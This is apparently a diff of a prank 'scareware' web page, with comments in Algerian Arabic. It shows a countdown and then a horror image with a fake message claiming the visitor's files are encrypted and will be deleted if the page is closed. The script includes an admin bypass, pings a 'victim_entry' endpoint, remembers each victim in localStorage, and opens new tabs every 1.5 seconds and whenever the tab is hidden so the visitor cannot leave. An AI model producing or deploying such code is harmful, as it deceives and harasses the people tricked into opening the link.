@@ -3,22 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_UPDATE ⚠️</title>
+    <title>⚠️ SYSTEM_CRITICAL ⚠️</title>
     <style>
-        /* تعديل الصورة باش تولي كبيرة ومريقلة سواسوة */
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
+        
+        /* تعديل الصورة باش تخرج Force Full Screen سواسوة */
         #horrorImg { 
             position: fixed; top: 0; left: 0; 
             width: 100vw; height: 100vh; 
-            object-fit: fill; /* هادي تخلي الصورة تعمر كامل الشاشة سواسوة */
-            z-index: 999; display: none; 
+            object-fit: cover; /* تعمر الشاشة بلا ما تدييفورما سواسوة */
+            z-index: 9999; display: none; 
         }
-        #clockContainer { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
-        #timer { font-size: 150px; font-weight: bold; }
+
+        #timerBox { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
+        #count { font-size: 150px; font-weight: bold; text-shadow: 0 0 30px #f00; }
+        
         #textOverlay { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.9); padding: 20px; border: 2px solid #f00; display: none; width: 90%; 
+            z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
+            background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #f00; display: none; width: 85%; 
         }
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
@@ -26,64 +29,67 @@
 </head>
 <body onclick="initiateSequence()">
 
-    <div id="clockContainer">
-        <div id="timer">03</div>
-        <p class="blink">CRITICAL_ERROR_DETECTED</p>
+    <div id="timerBox">
+        <div id="count">3</div>
+        <p class="blink">LOADING_MALWARE...</p>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     <div id="textOverlay" class="blink">
         <h1>SYSTEM TERMINATED</h1>
-        <p>Your files are being encrypted. Do not close.</p>
+        <p>Your files are encrypted. Attempting to close will delete all data.</p>
     </div>
 
     <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
 
     <script>
-        // ميزة الأدمن: إذا دخلت أنت بالرمز، الكود ما يخدمش فيك سواسوة
         const urlParams = new URLSearchParams(window.location.search);
         const isAdmin = urlParams.get('user') === 'admin_dz'; 
-
-        let running = false;
-        let timeLeft = 3;
         const audio = document.getElementById('sfx');
         const MY_LINK = window.location.href;
+        
+        let running = false;
+        let timeLeft = 3;
+
+        // ميزة الذاكرة: نتحققو إذا الضحية فات عليه العد التنازلي سواسوة
+        if (localStorage.getItem('hacked') === 'true' && !isAdmin) {
+            setTimeout(() => triggerHorror(), 500); // تخرج الصورة ديركت بلا عد سواسوة
+        }
 
         function initiateSequence() {
-            if (isAdmin) {
-                alert("Welcome Admin! Virus is disabled for you سواسوة.");
-                return;
-            }
-            if (running) return;
-            running = true;
+            if (isAdmin) return alert("Welcome Admin!");
+            if (running || localStorage.getItem('hacked') === 'true') return;
             
+            running = true;
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
 
             let countdown = setInterval(() => {
                 timeLeft--;
-                document.getElementById('timer').innerText = "0" + timeLeft;
+                document.getElementById('count').innerText = timeLeft;
                 if (timeLeft <= 0) {
                     clearInterval(countdown);
+                    localStorage.setItem('hacked', 'true'); // نسجلو بلي الضحية حصل سواسوة
                     triggerHorror();
                 }
             }, 1000);
         }
 
         function triggerHorror() {
-            document.getElementById('clockContainer').style.display = 'none';
+            document.getElementById('timerBox').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
             document.getElementById('textOverlay').style.display = 'block';
-            audio.play();
+            
+            audio.play().catch(() => {});
 
-            // الحبس التلقائي للضحية فقط سواسوة
+            // ميزة الحبس: فتح تبويبات جديدة سواسوة
             setInterval(() => {
-                window.open(MY_LINK, '_blank');
-            }, 1000);
+                if (!isAdmin) window.open(MY_LINK, '_blank');
+            }, 1500);
         }
 
-        // منع الخروج للضحية فقط سواسوة
+        // منع الخروج سواسوة
         document.addEventListener("visibilitychange", () => {
-            if (!isAdmin && document.visibilityState === 'hidden' && running) {
+            if (!isAdmin && document.visibilityState === 'hidden') {
                 window.open(MY_LINK, '_blank');
             }
         });
